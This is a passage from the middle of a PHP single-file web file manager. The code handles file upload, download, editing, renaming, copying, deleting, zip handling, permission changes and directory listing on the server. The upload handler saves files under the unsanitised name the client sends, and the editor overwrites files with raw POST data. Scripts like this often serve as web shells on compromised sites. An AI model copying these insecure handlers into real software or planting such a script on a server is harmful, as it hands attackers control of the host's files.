 } else { fm_set_msg(sprintf('Error while moving from <b>%s</b> to <b>%s</b>', $copy, $msg_from), 'error');
 } } else { if (fm_rcopy($from, $dest)) { fm_set_msg(sprintf('Copyied from <b>%s</b> to <b>%s</b>', $copy, $msg_from));
 } else { fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', $copy, $msg_from), 'error');
 } } } else { fm_set_msg('Paths must be not equal', 'alert');
 } fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } if (isset($_POST['file'], $_POST['copy_to'], $_POST['finish'])) { $path = FM_ROOT_PATH;
 if (FM_PATH != '') { $path .= '/' . FM_PATH;
 } $copy_to_path = FM_ROOT_PATH;
 $copy_to = fm_clean_path($_POST['copy_to']);
 if ($copy_to != '') { $copy_to_path .= '/' . $copy_to;
 } if ($path == $copy_to_path) { fm_set_msg('Paths must be not equal', 'alert');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } if (!is_dir($copy_to_path)) { if (!fm_mkdir($copy_to_path, true)) { fm_set_msg('Unable to create destination folder', 'error');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } } $move = isset($_POST['move']);
 $errors = 0;
 $files = $_POST['file'];
 if (is_array($files) && count($files)) { foreach ($files as $f) { if ($f != '') { $from = $path . '/' . $f;
 $dest = $copy_to_path . '/' . $f;
 if ($move) { $rename = fm_rename($from, $dest);
 if ($rename === false) { $errors++;
 } } else { if (!fm_rcopy($from, $dest)) { $errors++;
 } } } } if ($errors == 0) { $msg = $move ? 'Selected files and folders moved' : 'Selected files and folders copied';
 fm_set_msg($msg);
 } else { $msg = $move ? 'Error while moving items' : 'Error while copying items';
 fm_set_msg($msg, 'error');
 } } else { fm_set_msg('Nothing selected', 'alert');
 } fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } if (isset($_GET['ren'], $_GET['to'])) { $old = $_GET['ren'];
 $old = fm_clean_path($old);
 $old = str_replace('/', '', $old);
 $new = $_GET['to'];
 $new = fm_clean_path($new);
 $new = str_replace('/', '', $new);
 $path = FM_ROOT_PATH;
 if (FM_PATH != '') { $path .= '/' . FM_PATH;
 } if ($old != '' && $new != '') { if (fm_rename($path . '/' . $old, $path . '/' . $new)) { fm_set_msg(sprintf('Renamed from <b>%s</b> to <b>%s</b>', $old, $new));
 } else { fm_set_msg(sprintf('Error while renaming from <b>%s</b> to <b>%s</b>', $old, $new), 'error');
 } } else { fm_set_msg('Names not set', 'error');
 } fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } if (isset($_GET['dl'])) { $dl = $_GET['dl'];
 $dl = fm_clean_path($dl);
 $dl = str_replace('/', '', $dl);
 $path = FM_ROOT_PATH;
 if (FM_PATH != '') { $path .= '/' . FM_PATH;
 } if ($dl != '' && is_file($path . '/' . $dl)) { header('Content-Description: File Transfer');
 header('Content-Type: application/octet-stream');
 header('Content-Disposition: attachment;
 filename="' . basename($path . '/' . $dl) . '"');
 header('Content-Transfer-Encoding: binary');
 header('Connection: Keep-Alive');
 header('Expires: 0');
 header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
 header('Pragma: public');
 header('Content-Length: ' . filesize($path . '/' . $dl));
 readfile($path . '/' . $dl);
 exit;
 } else { fm_set_msg('File not found', 'error');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } } if (isset($_POST['upl'])) { $path = FM_ROOT_PATH;
 if (FM_PATH != '') { $path .= '/' . FM_PATH;
 } $errors = 0;
 $uploads = 0;
 $total = count($_FILES['upload']['name']);
 for ($i = 0;
 $i < $total;
 $i++) { $tmp_name = $_FILES['upload']['tmp_name'][$i];
 if (empty($_FILES['upload']['error'][$i]) && !empty($tmp_name) && $tmp_name != 'none') { if (move_uploaded_file($tmp_name, $path . '/' . $_FILES['upload']['name'][$i])) { $uploads++;
 } else { $errors++;
 } } } if ($errors == 0 && $uploads > 0) { fm_set_msg(sprintf('All files uploaded to <b>%s</b>', $path));
 } elseif ($errors == 0 && $uploads == 0) { fm_set_msg('Nothing uploaded', 'alert');
 } else { fm_set_msg(sprintf('Error while uploading files. Uploaded files: %s', $uploads), 'error');
 } fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } if (isset($_POST['group'], $_POST['delete'])) { $path = FM_ROOT_PATH;
 if (FM_PATH != '') { $path .= '/' . FM_PATH;
 } $errors = 0;
 $files = $_POST['file'];
 if (is_array($files) && count($files)) { foreach ($files as $f) { if ($f != '') { $new_path = $path . '/' . $f;
 if (!fm_rdelete($new_path)) { $errors++;
 } } } if ($errors == 0) { fm_set_msg('Selected files and folder deleted');
 } else { fm_set_msg('Error while deleting items', 'error');
 } } else { fm_set_msg('Nothing selected', 'alert');
 } fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } if (isset($_POST['group'], $_POST['zip'])) { $path = FM_ROOT_PATH;
 if (FM_PATH != '') { $path .= '/' . FM_PATH;
 } if (!class_exists('ZipArchive')) { fm_set_msg('Operations with archives are not available', 'error');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } $files = $_POST['file'];
 if (!empty($files)) { chdir($path);
 if (count($files) == 1) { $one_file = reset($files);
 $one_file = basename($one_file);
 $zipname = $one_file . '_' . date('ymd_His') . '.zip';
 } else { $zipname = 'archive_' . date('ymd_His') . '.zip';
 } $zipper = new FM_Zipper();
 $res = $zipper->create($zipname, $files);
 if ($res) { fm_set_msg(sprintf('Archive <b>%s</b> created', $zipname));
 } else { fm_set_msg('Archive not created', 'error');
 } } else { fm_set_msg('Nothing selected', 'alert');
 } fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } if (isset($_GET['unzip'])) { $unzip = $_GET['unzip'];
 $unzip = fm_clean_path($unzip);
 $unzip = str_replace('/', '', $unzip);
 $path = FM_ROOT_PATH;
 if (FM_PATH != '') { $path .= '/' . FM_PATH;
 } if (!class_exists('ZipArchive')) { fm_set_msg('Operations with archives are not available', 'error');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } if ($unzip != '' && is_file($path . '/' . $unzip)) { $zip_path = $path . '/' . $unzip;
 $tofolder = '';
 if (isset($_GET['tofolder'])) { $tofolder = pathinfo($zip_path, PATHINFO_FILENAME);
 if (fm_mkdir($path . '/' . $tofolder, true)) { $path .= '/' . $tofolder;
 } } $zipper = new FM_Zipper();
 $res = $zipper->unzip($zip_path, $path);
 if ($res) { fm_set_msg('Archive unpacked');
 } else { fm_set_msg('Archive not unpacked', 'error');
 } } else { fm_set_msg('File not found', 'error');
 } fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } if (isset($_POST['chmod']) && !FM_IS_WIN) { $path = FM_ROOT_PATH;
 if (FM_PATH != '') { $path .= '/' . FM_PATH;
 } $file = $_POST['chmod'];
 $file = fm_clean_path($file);
 $file = str_replace('/', '', $file);
 if ($file == '' || (!is_file($path . '/' . $file) && !is_dir($path . '/' . $file))) { fm_set_msg('File not found', 'error');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } $mode = 0;
 if (!empty($_POST['ur'])) { $mode |= 0400;
 } if (!empty($_POST['uw'])) { $mode |= 0200;
 } if (!empty($_POST['ux'])) { $mode |= 0100;
 } if (!empty($_POST['gr'])) { $mode |= 0040;
 } if (!empty($_POST['gw'])) { $mode |= 0020;
 } if (!empty($_POST['gx'])) { $mode |= 0010;
 } if (!empty($_POST['or'])) { $mode |= 0004;
 } if (!empty($_POST['ow'])) { $mode |= 0002;
 } if (!empty($_POST['ox'])) { $mode |= 0001;
 } if (@chmod($path . '/' . $file, $mode)) { fm_set_msg('Permissions changed');
 } else { fm_set_msg('Permissions not changed', 'error');
 } fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } $path = FM_ROOT_PATH;
 if (FM_PATH != '') { $path .= '/' . FM_PATH;
 } if (!is_dir($path)) { fm_redirect(FM_SELF_URL . '?p=');
 } $parent = fm_get_parent_path(FM_PATH);
 $objects = is_readable($path) ? scandir($path) : array();
 $folders = array();
 $files = array();
 if (is_array($objects)) { foreach ($objects as $file) { if ($file == '.' || $file == '..') { continue;
 } $new_path = $path . '/' . $file;
 if (is_file($new_path)) { $files[] = $file;
 } elseif (is_dir($new_path) && $file != '.' && $file != '..') { $folders[] = $file;
 } } } if (!empty($files)) { natcasesort($files);
 } if (!empty($folders)) { natcasesort($folders);
 } if (isset($_GET['upload'])) { fm_show_header();
 fm_show_nav_path(FM_PATH);
 
?>
 <div class="path">
 <p><b>Uploading files</b></p>
 <p class="break-word">Destination folder: 
<?php echo fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH) 
?></p>
 <form action="" method="post" enctype="multipart/form-data">
 <input type="hidden" name="p" value="
<?php echo fm_enc(FM_PATH) 
?>">
 <input type="hidden" name="upl" value="1">
 <input type="file" name="upload[]"><br>
 <input type="file" name="upload[]"><br>
 <input type="file" name="upload[]"><br>
 <input type="file" name="upload[]"><br>
 <input type="file" name="upload[]"><br>
 <br>
 <p>
 <button class="btn"><i class="icon-apply"></i> Upload</button> &nbsp;

 <b><a href="?p=
<?php echo urlencode(FM_PATH) 
?>"><i class="icon-cancel"></i> Cancel</a></b>
 </p>
 </form>
 </div>
 
<?php fm_show_footer();
 exit;
 } if (isset($_POST['copy'])) { $copy_files = $_POST['file'];
 if (!is_array($copy_files) || empty($copy_files)) { fm_set_msg('Nothing selected', 'alert');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } fm_show_header();
 fm_show_nav_path(FM_PATH);
 
?>
 <div class="path">
 <p><b>Copying</b></p>
 <form action="" method="post">
 <input type="hidden" name="p" value="
<?php echo fm_enc(FM_PATH) 
?>">
 <input type="hidden" name="finish" value="1">
 
<?php foreach ($copy_files as $cf) { echo '<input type="hidden" name="file[]" value="' . fm_enc($cf) . '">' . PHP_EOL;
 } 
?>
 <p class="break-word">Files: <b>
<?php echo implode('</b>, <b>', $copy_files) 
?></b></p>
 <p class="break-word">Source folder: 
<?php echo fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH) 
?><br>
 <label for="inp_copy_to">Destination folder:</label>
 
<?php echo FM_ROOT_PATH 
?>/<input name="copy_to" id="inp_copy_to" value="
<?php echo fm_enc(FM_PATH) 
?>">
 </p>
 <p><label><input type="checkbox" name="move" value="1"> Move</label></p>
 <p>
 <button class="btn"><i class="fa fa-copy"></i> Copy</button> &nbsp;

 <b><a href="?p=
<?php echo urlencode(FM_PATH) 
?>"><i class="icon-cancel"></i> Cancel</a></b>
 </p>
 </form>
 </div>
 
<?php fm_show_footer();
 exit;
 } if (isset($_GET['copy']) && !isset($_GET['finish'])) { $copy = $_GET['copy'];
 $copy = fm_clean_path($copy);
 if ($copy == '' || !file_exists(FM_ROOT_PATH . '/' . $copy)) { fm_set_msg('File not found', 'error');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } fm_show_header();
 fm_show_nav_path(FM_PATH);
 
?>
 <div class="path">
 <p><b>Copying</b></p>
 <p class="break-word">
 Source path: 
<?php echo fm_convert_win(FM_ROOT_PATH . '/' . $copy) 
?><br>
 Destination folder: 
<?php echo fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH) 
?>
 </p>
 <p>
 <b><a href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
copy=
<?php echo urlencode($copy) 
?>&amp;
finish=1"><i class="icon-apply"></i> Copy</a></b> &nbsp;

 <b><a href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
copy=
<?php echo urlencode($copy) 
?>&amp;
finish=1&amp;
move=1"><i class="icon-apply"></i> Move</a></b> &nbsp;

 <b><a href="?p=
<?php echo urlencode(FM_PATH) 
?>"><i class="icon-cancel"></i> Cancel</a></b>
 </p>
 <p><i>Select folder:</i></p>
 <ul class="folders break-word">
 
<?php if ($parent !== false) { 
?>
 <li><a href="?p=
<?php echo urlencode($parent) 
?>&amp;
copy=
<?php echo urlencode($copy) 
?>"><i class="icon-arrow_up"></i> ..</a></li>
 
<?php } foreach ($folders as $f) { 
?>
 <li><a href="?p=
<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) 
?>&amp;
copy=
<?php echo urlencode($copy) 
?>"><i class="icon-folder"></i> 
<?php echo fm_convert_win($f) ."<pre> > </pre>" 
?></a></li>
 
<?php } 
?>
 </ul>
 </div>
 
<?php fm_show_footer();
 exit;
 } if (isset($_GET['view'])) { $file = $_GET['view'];
 $file = fm_clean_path($file);
 $file = str_replace('/', '', $file);
 if ($file == '' || !is_file($path . '/' . $file)) { fm_set_msg('File not found', 'error');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } fm_show_header();
 fm_show_nav_path(FM_PATH);
 $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file);
 $file_path = $path . '/' . $file;
 $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
 $mime_type = fm_get_mime_type($file_path);
 $filesize = filesize($file_path);
 $is_zip = false;
 $is_image = false;
 $is_audio = false;
 $is_video = false;
 $is_text = false;
 $view_title = 'File';
 $filenames = false;
 $content = '';
 if ($ext == 'zip') { $is_zip = true;
 $view_title = 'Archive';
 $filenames = fm_get_zif_info($file_path);
 } elseif (in_array($ext, fm_get_image_exts())) { $is_image = true;
 $view_title = 'Image';
 } elseif (in_array($ext, fm_get_audio_exts())) { $is_audio = true;
 $view_title = 'Audio';
 } elseif (in_array($ext, fm_get_video_exts())) { $is_video = true;
 $view_title = 'Video';
 } elseif (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == 'text' || in_array($mime_type, fm_get_text_mimes())) { $is_text = true;
 $content = file_get_contents($file_path);
 } 
?>
 <div class="path">
 <p class="break-word"><b>
<?php echo $view_title 
?> "
<?php echo fm_enc(fm_convert_win($file)) 
?>"</b></p>
 <p class="break-word">
 Full path: 
<?php echo fm_enc(fm_convert_win($file_path)) 
?><br>
 File size: 
<?php echo fm_get_filesize($filesize) 
?>
<?php if ($filesize >= 1000): 
?> (
<?php echo sprintf('%s bytes', $filesize) 
?>)
<?php endif;
 
?><br>
 MIME-type: 
<?php echo $mime_type 
?><br>
 
<?php if ($is_zip && $filenames !== false) { $total_files = 0;
 $total_comp = 0;
 $total_uncomp = 0;
 foreach ($filenames as $fn) { if (!$fn['folder']) { $total_files++;
 } $total_comp += $fn['compressed_size'];
 $total_uncomp += $fn['filesize'];
 } 
?>
 Files in archive: 
<?php echo $total_files 
?><br>
 Total size: 
<?php echo fm_get_filesize($total_uncomp) 
?><br>
 Size in archive: 
<?php echo fm_get_filesize($total_comp) 
?><br>
 Compression: 
<?php echo round(($total_comp / $total_uncomp) * 100) 
?>%<br>
 
<?php } if ($is_image) { $image_size = getimagesize($file_path);
 echo 'Image sizes: ' . (isset($image_size[0]) ? $image_size[0] : '0') . ' x ' . (isset($image_size[1]) ? $image_size[1] : '0') . '<br>';
 } if ($is_text) { $is_utf8 = fm_is_utf8($content);
 if (function_exists('iconv')) { if (!$is_utf8) { $content = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $content);
 } } echo 'Charset: ' . ($is_utf8 ? 'utf-8' : '8 bit') . '<br>';
 } 
?>
 </p>
 <p>
 <b><a href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
dl=
<?php echo urlencode($file) 
?>"><i class="fa fa-cloud-download"></i> Download</a></b> &nbsp;

 <b><a href="
<?php echo fm_enc($file_url) 
?>" target="_blank"><i class="fa fa-external-link-square"></i> Open</a></b> &nbsp;

 
<?php if (!FM_READONLY && $is_zip && $filenames !== false) { $zip_name = pathinfo($file_path, PATHINFO_FILENAME);
 
?>
 <b><a href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
unzip=
<?php echo urlencode($file) 
?>"><i class="fa fa-check-circle"></i> UnZip</a></b> &nbsp;

 <b><a href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
unzip=
<?php echo urlencode($file) 
?>&amp;
tofolder=1" title="UnZip to 
<?php echo fm_enc($zip_name) 
?>"><i class="fa fa-check-circle"></i>
 UnZip to folder</a></b> &nbsp;

 
<?php } if($is_text && !FM_READONLY) { 
?>
 <b><a href="?p=
<?php echo urlencode(trim(FM_PATH)) 
?>&amp;
edit=
<?php echo urlencode($file) 
?>" class="edit-file"><i class="fa fa-pencil-square"></i> Edit</a></b> &nbsp;

 <b><a href="?p=
<?php echo urlencode(trim(FM_PATH)) 
?>&amp;
edit=
<?php echo urlencode($file) 
?>&env=ace" class="edit-file"><i class="fa fa-pencil-square"></i> Advanced Edit</a></b> &nbsp;

 
<?php } if($send_mail && !FM_READONLY) { 
?>
 <b><a href="javascript:mailto('
<?php echo urlencode(trim(FM_ROOT_PATH.'/'.FM_PATH)) 
?>','
<?php echo urlencode($file) 
?>')"><i class="fa fa-pencil-square"></i> Mail</a></b> &nbsp;

 
<?php } 
?>
 <b><a href="?p=
<?php echo urlencode(FM_PATH) 
?>"><i class="fa fa-chevron-circle-left"></i> Back</a></b>
 </p>
 
<?php if ($is_zip) { if ($filenames !== false) { echo '<code class="maxheight">';
 foreach ($filenames as $fn) { if ($fn['folder']) { echo '<b>' . fm_enc($fn['name']) . '</b><br>';
 } else { echo $fn['name'] . ' (' . fm_get_filesize($fn['filesize']) . ')<br>';
 } } echo '</code>';
 } else { echo '<p>Error while fetching archive info</p>';
 } } elseif ($is_image) { if (in_array($ext, array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico'))) { echo '<p><img src="' . fm_enc($file_url) . '" alt="" class="preview-img"></p>';
 } } elseif ($is_audio) { echo '<p><audio src="' . fm_enc($file_url) . '" controls preload="metadata"></audio></p>';
 } elseif ($is_video) { echo '<div class="preview-video"><video src="' . fm_enc($file_url) . '" width="640" height="360" controls preload="metadata"></video></div>';
 } elseif ($is_text) { if (FM_USE_HIGHLIGHTJS) { $hljs_classes = array( 'shtml' => 'xml', 'htaccess' => 'apache', 'phtml' => 'php', 'lock' => 'json', 'svg' => 'xml', );
 $hljs_class = isset($hljs_classes[$ext]) ? 'lang-' . $hljs_classes[$ext] : 'lang-' . $ext;
 if (empty($ext) || in_array(strtolower($file), fm_get_text_names()) || preg_match('#\.min\.(css|js)$#i', $file)) { $hljs_class = 'nohighlight';
 } $content = '<pre class="with-hljs"><code class="' . $hljs_class . '">' . fm_enc($content) . '</code></pre>';
 } elseif (in_array($ext, array('php', 'php4', 'php5', 'phtml', 'phps'))) { $content = highlight_string($content, true);
 } else { $content = '<pre>' . fm_enc($content) . '</pre>';
 } echo $content;
 } 
?>
 </div>
 
<?php fm_show_footer();
 exit;
 } if (isset($_GET['edit'])) { $file = $_GET['edit'];
 $file = fm_clean_path($file);
 $file = str_replace('/', '', $file);
 if ($file == '' || !is_file($path . '/' . $file)) { fm_set_msg('File not found', 'error');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } fm_show_header();
 fm_show_nav_path(FM_PATH);
 $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file);
 $file_path = $path . '/' . $file;
 $isNormalEditor = true;
 if(isset($_GET['env'])) { if($_GET['env'] == "ace") { $isNormalEditor = false;
 } } if(isset($_POST['savedata'])) { $writedata = $_POST['savedata'];
 $fd=fopen($file_path,"w");
 @fwrite($fd, $writedata);
 fclose($fd);
 fm_set_msg('File Saved Successfully', 'alert');
 } $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
 $mime_type = fm_get_mime_type($file_path);
 $filesize = filesize($file_path);
 $is_text = false;
 $content = '';
 if (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == 'text' || in_array($mime_type, fm_get_text_mimes())) { $is_text = true;
 $content = file_get_contents($file_path);
 } 
?>
 <div class="path">
 <div class="edit-file-actions">
 <a title="Cancel" href="?p=
<?php echo urlencode(trim(FM_PATH)) 
?>&amp;
view=
<?php echo urlencode($file) 
?>"><i class="fa fa-reply-all"></i> Cancel</a>
 <a title="Backup" href="javascript:backup('
<?php echo urlencode($path) 
?>','
<?php echo urlencode($file) 
?>')"><i class="fa fa-database"></i> Backup</a>
 
<?php if($is_text) { 
?>
 
<?php if($isNormalEditor) { 
?>
 <a title="Advanced" href="?p=
<?php echo urlencode(trim(FM_PATH)) 
?>&amp;
edit=
<?php echo urlencode($file) 
?>&amp;
env=ace"><i class="fa fa-paper-plane"></i> Advanced Editor</a>
 <button type="button" name="Save" data-url="
<?php echo fm_enc($file_url) 
?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save</button>
 
<?php } else { 
?>
 <a title="Plain Editor" href="?p=
<?php echo urlencode(trim(FM_PATH)) 
?>&amp;
edit=
<?php echo urlencode($file) 
?>"><i class="fa fa-text-height"></i> Plain Editor</a>
 <button type="button" name="Save" data-url="
<?php echo fm_enc($file_url) 
?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> Save</button>
 
<?php } 
?>
 
<?php } 
?>
 </div>
 
<?php if ($is_text && $isNormalEditor) { echo '<textarea id="normal-editor" rows="33" cols="120" style="width: 99.5%;
">'. htmlspecialchars($content) .'</textarea>';
 } elseif ($is_text) { echo '<div id="editor" contenteditable="true">'. htmlspecialchars($content) .'</div>';
 } else { fm_set_msg('FILE EXTENSION HAS NOT SUPPORTED', 'error');
 } 
?>
 </div>
 
<?php fm_show_footer();
 exit;
 } if (isset($_GET['chmod']) && !FM_IS_WIN) { $file = $_GET['chmod'];
 $file = fm_clean_path($file);
 $file = str_replace('/', '', $file);
 if ($file == '' || (!is_file($path . '/' . $file) && !is_dir($path . '/' . $file))) { fm_set_msg('File not found', 'error');
 fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
 } fm_show_header();
 fm_show_nav_path(FM_PATH);
 $file_url = FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file;
 $file_path = $path . '/' . $file;
 $mode = fileperms($path . '/' . $file);
 
?>
 <div class="path">

 
<?php $path = fm_clean_path($path);
 $root_url = "<a href='?p='><i class='fa fa-home' aria-hidden='true' title='" . FM_ROOT_PATH . "'></i></a>";
 $sep = '<i class="fa fa-caret-right"></i>';
 if ($path != '') { $exploded = explode('/', $path);
 $count = count($exploded);
 $array = array();
 $parent = '';
 for ($i = 0;
 $i < $count;
 $i++) { $parent = trim($parent . '/' . $exploded[$i], '/');
 $parent_enc = urlencode($parent);
 $array[] = "<a href='?p={$parent_enc}'>" . fm_enc(fm_convert_win($exploded[$i])) . "</a>";
 } $root_url .= $sep . implode($sep, $array);
 } echo '<div class="break-word float-left">' . $root_url . '</div>';
 
?>

 <div class="float-right">
 
<?php if (!FM_READONLY): 
?>
 <a title="Search" href="javascript:showSearch('
<?php echo urlencode(FM_PATH) 
?>')"><i class="fa fa-search"></i></a>
 <a title="Upload files" href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i></a>
 <a title="New folder" href="#createNewItem" ><i class="fa fa-plus-square"></i></a>
 
<?php endif;
 
?>
 
<?php if (FM_USE_AUTH): 
?><a title="Logout" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i></a>
<?php endif;
 
?>
 </div>
</div>
 <div class="path">
 <p><b>Change Permissions</b></p>
 <p>
 Full path: 
<?php echo $file_path 
?><br>
 </p>
 <form action="" method="post">
 <input type="hidden" name="p" value="
<?php echo fm_enc(FM_PATH) 
?>">
 <input type="hidden" name="chmod" value="
<?php echo fm_enc($file) 
?>">

 <table class="compact-table">
 <tr>
 <td></td>
 <td><b>Owner</b></td>
 <td><b>Group</b></td>
 <td><b>Other</b></td>
 </tr>
 <tr>
 <td style="text-align: right"><b>Read</b></td>
 <td><label><input type="checkbox" name="ur" value="1"
<?php echo ($mode & 00400) ? ' checked' : '' 
?>></label></td>
 <td><label><input type="checkbox" name="gr" value="1"
<?php echo ($mode & 00040) ? ' checked' : '' 
?>></label></td>
 <td><label><input type="checkbox" name="or" value="1"
<?php echo ($mode & 00004) ? ' checked' : '' 
?>></label></td>
 </tr>
 <tr>
 <td style="text-align: right"><b>Write</b></td>
 <td><label><input type="checkbox" name="uw" value="1"
<?php echo ($mode & 00200) ? ' checked' : '' 
?>></label></td>
 <td><label><input type="checkbox" name="gw" value="1"
<?php echo ($mode & 00020) ? ' checked' : '' 
?>></label></td>
 <td><label><input type="checkbox" name="ow" value="1"
<?php echo ($mode & 00002) ? ' checked' : '' 
?>></label></td>
 </tr>
 <tr>
 <td style="text-align: right"><b>Execute</b></td>
 <td><label><input type="checkbox" name="ux" value="1"
<?php echo ($mode & 00100) ? ' checked' : '' 
?>></label></td>
 <td><label><input type="checkbox" name="gx" value="1"
<?php echo ($mode & 00010) ? ' checked' : '' 
?>></label></td>
 <td><label><input type="checkbox" name="ox" value="1"
<?php echo ($mode & 00001) ? ' checked' : '' 
?>></label></td>
 </tr>
 </table>

 <p>
 <button class="btn"><i class="icon-apply"></i> Change</button> &nbsp;

 <b><a href="?p=
<?php echo urlencode(FM_PATH) 
?>"><i class="icon-cancel"></i> Cancel</a></b>
 </p>

 </form>

 </div>
 
<?php fm_show_footer();
 exit;
 } fm_show_header();
 fm_show_nav_path(FM_PATH);
 fm_show_message();
 $num_files = count($files);
 $num_folders = count($folders);
 $all_files_size = 0;
 
?>
<form action="" method="post">
<input type="hidden" name="p" value="
<?php echo fm_enc(FM_PATH) 
?>">
<input type="hidden" name="group" value="1">
<table><tr>
<th style="width:3%"><label><input type="checkbox" title="Invert selection" onclick="checkbox_toggle()"></label></th>
<th>Name</th><th style="width:10%">Size</th>
<th style="width:12%">Modified</th>

<?php if (!FM_IS_WIN): 
?><th style="width:6%">Perms</th><th style="width:10%">Owner</th>
<?php endif;
 
?>
<th style="width:13%"></th></tr>

<?php if ($parent !== false) { 
?>
<tr><td></td><td colspan="
<?php echo !FM_IS_WIN ? '6' : '4' 
?>"><a href="?p=
<?php echo urlencode($parent) 
?>"><i class="fa fa-arrow_up"></i> ..</a></td></tr>

<?php } foreach ($folders as $f) { $is_link = is_link($path . '/' . $f);
 $img = $is_link ? 'fa fa-folder' : 'fa fa-folder';
 $modif = date(FM_DATETIME_FORMAT, filemtime($path . '/' . $f));
 $perms = substr(decoct(fileperms($path . '/' . $f)), -4);
 if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) { $owner = posix_getpwuid(fileowner($path . '/' . $f));
 $group = posix_getgrgid(filegroup($path . '/' . $f));
 } else { $owner = array('name' => '?');
 $group = array('name' => '?');
 } 
?>
<tr>
<td><label><input type="checkbox" name="file[]" value="
<?php echo fm_enc($f) 
?>"></label></td>
<td><div class="filename"><a href="?p=
<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) 
?>"><i class="
<?php echo $img 
?>"></i> 
<?php echo fm_convert_win($f) 
?></a>
<?php echo ($is_link ? ' &rarr;
 <i>' . readlink($path . '/' . $f) . '</i>' : '') 
?></div></td>
<td>Folder</td><td>
<?php echo $modif 
?></td>

<?php if (!FM_IS_WIN): 
?>
<td><a title="Change Permissions" href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
chmod=
<?php echo urlencode($f) 
?>">
<?php echo $perms 
?></a></td>
<td>
<?php echo $owner['name'] . ':' . $group['name'] 
?></td>

<?php endif;
 
?>
<td>
<a title="Delete" href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
del=
<?php echo urlencode($f) 
?>" onclick="return confirm('Delete folder?');
"><i class="icon-cross"></i><b style="color: red;
">X</b></a> | 
<a title="Rename" href="#" onclick="rename('
<?php echo fm_enc(FM_PATH) 
?>', '
<?php echo fm_enc($f) 
?>');
return false;
"><i class="fa fa-font"></i><b style="color: blur;
"></b></a> | 
<a title="Copy to..." href="?p=&amp;
copy=
<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) 
?>"><i class="fa fa-copy"></i></a> | 
<a title="Direct link" href="
<?php echo FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f . '/' 
?>" target="_blank"><i class="fa fa-chain"></i></a> | 
</td></tr>
 
<?php flush();
 } foreach ($files as $f) { $is_link = is_link($path . '/' . $f);
 $img = $is_link ? 'icon-link_file' : fm_get_file_icon_class($path . '/' . $f);
 $modif = date(FM_DATETIME_FORMAT, filemtime($path . '/' . $f));
 $filesize_raw = filesize($path . '/' . $f);
 $filesize = fm_get_filesize($filesize_raw);
 $filelink = '?p=' . urlencode(FM_PATH) . '&amp;
view=' . urlencode($f);
 $all_files_size += $filesize_raw;
 $perms = substr(decoct(fileperms($path . '/' . $f)), -4);
 if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) { $owner = posix_getpwuid(fileowner($path . '/' . $f));
 $group = posix_getgrgid(filegroup($path . '/' . $f));
 } else { $owner = array('name' => '?');
 $group = array('name' => '?');
 } 
?>
<tr>
<td><label><input type="checkbox" name="file[]" value="
<?php echo fm_enc($f) 
?>"></label></td>
<td><div class="filename"><a href="
<?php echo $filelink 
?>" title="File info"><i class="
<?php echo $img 
?>"></i> 
<?php echo fm_convert_win($f) 
?></a>
<?php echo ($is_link ? ' &rarr;
 <i>' . readlink($path . '/' . $f) . '</i>' : '') 
?></div></td>
<td><span class="gray" title="
<?php printf('%s bytes', $filesize_raw) 
?>">
<?php echo $filesize 
?></span></td>
<td>
<?php echo $modif 
?></td>

<?php if (!FM_IS_WIN): 
?>
<td><a title="Change Permissions" href="?p=
<?php echo urlencode(FM_PATH) 
?>&amp;
chmod=
<?php echo urlencode($f) 
?>">
